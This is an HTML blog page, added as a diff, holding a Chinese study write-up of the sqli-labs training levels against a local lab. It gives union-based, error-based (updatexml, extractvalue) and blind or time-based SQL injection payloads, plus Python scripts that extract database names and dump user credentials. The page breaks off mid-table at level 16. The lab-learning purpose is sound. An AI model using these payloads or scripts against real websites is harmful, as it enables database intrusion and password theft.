@@ -1,0 +1,846 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="刘伟松">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2023/12/20/12月20日——sql注入/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="一、sql注入语句1.使用环境php5.5.9，mysql5.7.26，sqli文件夹，在WWW下装sqli文件，开启apache服务并访问sqli，初始化数据库 2.所用语句 mysql -u root -p 登录数据库的shell show databases 展示所有库 use 库名   使用库名 show tables 展示该库下的所有表名 select 1,group_concat(co">
+<meta property="og:type" content="article">
+<meta property="og:title" content="12月20日——sql注入">
+<meta property="og:url" content="http://example.com/2023/12/20/12%E6%9C%8820%E6%97%A5%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="一、sql注入语句1.使用环境php5.5.9，mysql5.7.26，sqli文件夹，在WWW下装sqli文件，开启apache服务并访问sqli，初始化数据库 2.所用语句 mysql -u root -p 登录数据库的shell show databases 展示所有库 use 库名   使用库名 show tables 展示该库下的所有表名 select 1,group_concat(co">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/liuweisongg/picture@main//imgKuanZiJie.PNG">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/liuweisongg/picture@main//imgAnQuanGouyakit.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/liuweisongg/picture@main//imgAnQuanGousuijishuzi.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/liuweisongg/picture@main//imgBPzhubao.png">
+<meta property="article:published_time" content="2023-12-20T08:20:27.000Z">
+<meta property="article:modified_time" content="2024-01-08T13:32:07.419Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/liuweisongg/picture@main//imgKuanZiJie.PNG">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            12月20日——sql注入 -
+        
+        欢迎光临
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"有志者，事竟成。","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                欢迎光临
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            
+                <h1 class="article-title-regular">12月20日——sql注入</h1>
+            
+            </div>
+            
+                    
+        
+        
+            <div class="article-header flex flex-row gap-2 items-center">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/redefine-avatar.svg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">刘伟松</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-12-20 16:20:27</span>
+        <span class="mobile">2023-12-20 16:20:27</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-01-08 21:32:07</span>
+            <span class="mobile">2024-01-08 21:32:07</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body">
+            <h1 id="一、sql注入语句"><a href="#一、sql注入语句" class="headerlink" title="一、sql注入语句"></a>一、sql注入语句</h1><h2 id="1-使用环境"><a href="#1-使用环境" class="headerlink" title="1.使用环境"></a>1.使用环境</h2><p>php5.5.9，mysql5.7.26，sqli文件夹，在WWW下装sqli文件，开启apache服务并访问sqli，初始化数据库</p>
+<h2 id="2-所用语句"><a href="#2-所用语句" class="headerlink" title="2.所用语句"></a>2.所用语句</h2><ul>
+<li>mysql -u root -p 登录数据库的shell</li>
+<li>show databases 展示所有库</li>
+<li>use 库名   使用库名</li>
+<li>show tables 展示该库下的所有表名</li>
+<li>select 1,group_concat(column_name) ,3 from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database(); – -  获得字段名</li>
+<li>select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema&#x3D;database();   获得表名</li>
+<li>select group_concat(id,”<del>“,username,”</del>“,password) from users ;获得账号密码</li>
+</ul>
+<p>报错语句（前4常用）：</p>
+<ul>
+<li>(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</li>
+<li>(extractvalue(1,concat(0x7e,(select user()),0x7e)))</li>
+<li>(updatexml(1,concat(0x7e,(select user()),0x7e),1))</li>
+<li>exp(~(select * from(select user())a))    </li>
+<li>geometrycollection((select * from(select * from(select user())a)b))</li>
+<li>multipoint((select * from(select * from(select user())a)b))</li>
+<li>polygon((select * from(select * from(select user())a)b))</li>
+<li>multipolygon((select * from(select * from(select user())a)b))</li>
+<li>linestring((select * from(select * from(select user())a)b))</li>
+<li>multilinestring((select * from(select * from(select user())a)b))</li>
+</ul>
+<h2 id="3-sqli闯关"><a href="#3-sqli闯关" class="headerlink" title="3.sqli闯关"></a>3.sqli闯关</h2><p>1~4关，首先利用HackBar插件，传入?id&#x3D;1判断自己的传参位置</p>
+<h3 id="第一关："><a href="#第一关：" class="headerlink" title="第一关："></a>第一关：</h3><p>?id&#x3D;0’ union select 1,group_concat(id,”<del>“,username,”</del>“,password),3 from users;– -</p>
+<h3 id="第二关："><a href="#第二关：" class="headerlink" title="第二关："></a>第二关：</h3><p>?id&#x3D;0 union select 1,group_concat(id,”<del>“,username,”</del>“,password),3 from users;– -</p>
+<h3 id="第三关："><a href="#第三关：" class="headerlink" title="第三关："></a>第三关：</h3><p>?id&#x3D;0’) union select 1,group_concat(id,”<del>“,username,”</del>“,password),3 from users;– -</p>
+<h3 id="第四关："><a href="#第四关：" class="headerlink" title="第四关："></a>第四关：</h3><p>?id&#x3D;0”) union select 1,group_concat(id,”<del>“,username,”</del>“,password),3 from users;– -</p>
+<h3 id="第五关（报错回显）："><a href="#第五关（报错回显）：" class="headerlink" title="第五关（报错回显）："></a>第五关（报错回显）：</h3><p><a class="link"   target="_blank" rel="noopener" href="http://192.168.2.71/sqli/Less-5/?id=1" >http://192.168.2.71/sqli/Less-5/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) – -</p>
+<h3 id="第六关："><a href="#第六关：" class="headerlink" title="第六关："></a>第六关：</h3><p><a class="link"   target="_blank" rel="noopener" href="http://192.168.2.71/sqli/Less-6/?id=1" >http://192.168.2.71/sqli/Less-6/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“ and (updatexml(1,concat(0x7e,(select database()),0x7e),1))– -</p>
+<h3 id="第七关："><a href="#第七关：" class="headerlink" title="第七关："></a>第七关：</h3><p>利用脚本盲注</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">session = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://192.168.2.39/sqli/Less-7/?id=1&#x27;))&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        begin =<span class="number">32</span></span><br><span class="line">        end =<span class="number">128</span></span><br><span class="line">        tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> begin &lt; end :</span><br><span class="line">            paramsGet = url+ <span class="string">&quot;/**/and/**/ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span>.<span class="built_in">format</span>(i,tmp)</span><br><span class="line">            response = session.get(paramsGet)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in.... Use outfile......&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                begin = tmp + <span class="number">1</span></span><br><span class="line">                tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = tmp</span><br><span class="line">                tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(tmp==<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        name += <span class="built_in">chr</span>(tmp)</span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line">db()</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="第八关："><a href="#第八关：" class="headerlink" title="第八关："></a>第八关：</h3><p>用脚本注入</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">session = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://192.168.2.39/sqli/Less-8/?id=1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        begin =<span class="number">32</span></span><br><span class="line">        end =<span class="number">128</span></span><br><span class="line">        tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> begin &lt; end :</span><br><span class="line">            paramsGet = url+ <span class="string">&quot;/**/and/**/ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span>.<span class="built_in">format</span>(i,tmp)</span><br><span class="line">            response = session.get(paramsGet)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                begin = tmp + <span class="number">1</span></span><br><span class="line">                tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = tmp</span><br><span class="line">                tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(tmp==<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        name += <span class="built_in">chr</span>(tmp)</span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line">db()</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="第九关："><a href="#第九关：" class="headerlink" title="第九关："></a>第九关：</h3><p>脚本注入</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">session=requests.session()</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://192.168.2.39/sqli/Less-9/?id=1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    name =<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">150</span>):</span><br><span class="line">         begin =<span class="number">32</span></span><br><span class="line">         end =<span class="number">128</span></span><br><span class="line">         mid=(begin+end)//<span class="number">2</span></span><br><span class="line">         <span class="keyword">while</span> begin&lt;end:</span><br><span class="line">             start_time=time.time()</span><br><span class="line">             payload = <span class="string">f&quot;/**/and/**/if(ascii(substring(database(),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,sleep(1))-- -&quot;</span></span><br><span class="line">             r=session.get(url + payload)</span><br><span class="line">             end_time=time.time()</span><br><span class="line">             <span class="keyword">if</span> end_time-start_time&lt;<span class="number">1</span>:</span><br><span class="line">                 begin=mid+<span class="number">1</span></span><br><span class="line">                 mid=(begin+end) //<span class="number">2</span></span><br><span class="line">             <span class="keyword">else</span>:</span><br><span class="line">                 end=mid</span><br><span class="line">                 mid=(begin+end) //<span class="number">2</span></span><br><span class="line">         <span class="keyword">if</span> (mid==<span class="number">32</span>):</span><br><span class="line">             <span class="keyword">break</span></span><br><span class="line">         name += <span class="built_in">chr</span>(mid)</span><br><span class="line">         <span class="built_in">print</span>(name)</span><br><span class="line">db()</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+<h3 id="第十关："><a href="#第十关：" class="headerlink" title="第十关："></a>第十关：</h3><p>脚本注入</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">session=requests.session()</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://192.168.2.39/sqli/Less-9/?id=1&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def db():</span></span><br><span class="line"><span class="string">    name =&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    for i in range(1,150):</span></span><br><span class="line"><span class="string">         begin =32</span></span><br><span class="line"><span class="string">         end =128</span></span><br><span class="line"><span class="string">         mid=(begin+end)//2</span></span><br><span class="line"><span class="string">         while begin&lt;end:</span></span><br><span class="line"><span class="string">             start_time=time.time()</span></span><br><span class="line"><span class="string">             payload = f&quot;</span>/**/<span class="keyword">and</span>/**/<span class="keyword">if</span>(<span class="built_in">ascii</span>(substring(database(),&#123;i&#125;,<span class="number">1</span>))&gt;&#123;mid&#125;,<span class="number">1</span>,sleep(<span class="number">1</span>))-- -<span class="string">&quot;</span></span><br><span class="line"><span class="string">             r=session.get(url + payload)</span></span><br><span class="line"><span class="string">             end_time=time.time()</span></span><br><span class="line"><span class="string">             if end_time-start_time&lt;1:</span></span><br><span class="line"><span class="string">                 begin=mid+1</span></span><br><span class="line"><span class="string">                 mid=(begin+end) //2</span></span><br><span class="line"><span class="string">             else:</span></span><br><span class="line"><span class="string">                 end=mid</span></span><br><span class="line"><span class="string">                 mid=(begin+end) //2</span></span><br><span class="line"><span class="string">         if (mid==32):</span></span><br><span class="line"><span class="string">             break</span></span><br><span class="line"><span class="string">         name += chr(mid)</span></span><br><span class="line"><span class="string">         print(name)</span></span><br><span class="line"><span class="string">db()</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="第十一关："><a href="#第十一关：" class="headerlink" title="第十一关："></a>第十一关：</h3><p>利用yakit抓包，修改成下列语句<code>uname=-1&#39;  union  select  1,database()#&amp;passwd=admin&amp;submit=Submit</code></p>
+<h3 id="第十二关："><a href="#第十二关：" class="headerlink" title="第十二关："></a>第十二关：</h3><p>利用yakit抓包，修改成下列语句<code>uname=0&quot;) union select 1,database()-- -&amp;passwd=admin&amp;submit=Submit</code></p>
+<h3 id="第十三关："><a href="#第十三关：" class="headerlink" title="第十三关："></a>第十三关：</h3><p>利用yakit抓包，修改成下列语句<code>uname=a&#39;) or (select 1 from (select count(\),concat(user(),floor(rand(0)\2))x from information_schema.tables group by x)a)-- -&amp;passwd=admin&amp;submit=Submit</code></p>
+<h3 id="第十四关："><a href="#第十四关：" class="headerlink" title="第十四关："></a>第十四关：</h3><p>利用yakit抓包，修改成下列语句<code>uname=a&quot; or (select 1 from (select count(\),concat(user(),floor(rand(0)\2))x from information_schema.tables group by x)a)-- - &amp;passwd=admin&amp;submit=Submit</code></p>
+<h3 id="第十五关："><a href="#第十五关：" class="headerlink" title="第十五关："></a>第十五关：</h3><p>利用脚本</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">url = <span class="string">&quot;http://192.168.2.39/sqli/Less-15/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_2</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">80</span>):</span><br><span class="line">        start = <span class="number">32</span></span><br><span class="line">        end = <span class="number">128</span>  <span class="comment"># 使用可打印的ASCII范围32到127</span></span><br><span class="line">        <span class="keyword">while</span> start &lt; end:</span><br><span class="line">            mid = (start + end) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;uname&quot;</span>: <span class="string">f&quot;adm&#x27; or if(ascii(substr(database(),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)-- -&quot;</span>,</span><br><span class="line">                <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            response = session.post(url, data=data)</span><br><span class="line">            <span class="comment"># print(response.text)</span></span><br><span class="line">            <span class="comment"># print(len(response.text))</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;flag.jpg&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="comment"># 如果内容大于某个长度，假设SQL条件为真</span></span><br><span class="line">                start = mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = mid</span><br><span class="line">            <span class="comment"># 调试输出来理解过程</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;测试位置 <span class="subst">&#123;i&#125;</span>, 字符ASCII: <span class="subst">&#123;mid&#125;</span>, start = <span class="subst">&#123;start&#125;</span>, end = <span class="subst">&#123;end&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 循环结束后需要重新设置mid点</span></span><br><span class="line">        mid = (start + end) // <span class="number">2</span></span><br><span class="line">        found_char = <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span>:  <span class="comment"># 如果ASCII是32（空格），可能表示结束</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        name += found_char</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;找到的字符: <span class="subst">&#123;found_char&#125;</span>, 目前的数据库名称: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;最终数据库名称: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db_2()</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="第十六关："><a href="#第十六关：" class="headerlink" title="第十六关："></a>第十六关：</h3><p>利用脚本</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td 